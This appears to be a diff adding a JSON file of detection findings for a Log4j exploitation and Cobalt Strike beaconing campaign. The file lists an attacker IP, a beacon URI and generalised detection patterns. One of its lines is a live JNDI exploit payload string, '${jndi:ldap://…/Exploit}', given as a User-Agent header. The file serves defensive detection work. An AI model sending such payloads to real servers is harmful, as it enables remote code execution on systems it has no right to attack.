@@ -1,0 +1,43 @@
+{
+  "task": "Behavioural Pattern Discovery",
+  "static_indicators": [
+    "185.220.101.5",
+    "185.220.101.5:1389",
+    "target.local"
+  ],
+  "protocol_indicators": [
+    "HTTP POST with User-Agent containing ${jndi:ldap://",
+    "HTTP GET to /api/v2/beacon?id=",
+    "TLS port 443"
+  ],
+  "behavioural_indicators": [
+    "periodic outbound connections every ~1 second with zero jitter",
+    "beaconing GET requests to /api/v2/beacon",
+    "sequence POST exploit then GET beacon"
+  ],
+  "campaign_specific_indicators": [
+    "specific LDAP server 185.220.101.5:1389",
+    "specific User-Agent payload ${jndi:ldap://185.220.101.5:1389/Exploit}",
+    "specific internal host target.local"
+  ],
+  "reusable_patterns": [
+    {
+      "pattern_name": "JNDI LDAP payload in HTTP User-Agent",
+      "protocol": "HTTP",
+      "stable_characteristics": "User-Agent header contains ${jndi:ldap://<any_host>:<any_port>/<any_path>}",
+      "generalization_rationale": "Detects Log4j exploitation attempts independent of attacker IP or target host"
+    },
+    {
+      "pattern_name": "C2 beacon GET to /api/v2/beacon with id param",
+      "protocol": "HTTP",
+      "stable_characteristics": "GET request URI matches ^/api/v2/beacon\\?id=\\d+$ over TLS",
+      "generalization_rationale": "Captures Cobalt Strike beacon traffic regardless of source/destination"
+    },
+    {
+      "pattern_name": "Low\u2011jitter periodic HTTPS connections",
+      "protocol": "TCP/HTTPS",
+      "stable_characteristics": "Repeated TCP connections to same remote IP/port with inter\u2011arrival time ~1\u202fs \u00b10.1\u202fs over multiple packets",
+      "generalization_rationale": "Identifies beaconing behavior typical of C2, not tied to specific IPs"
+    }
+  ]
+}
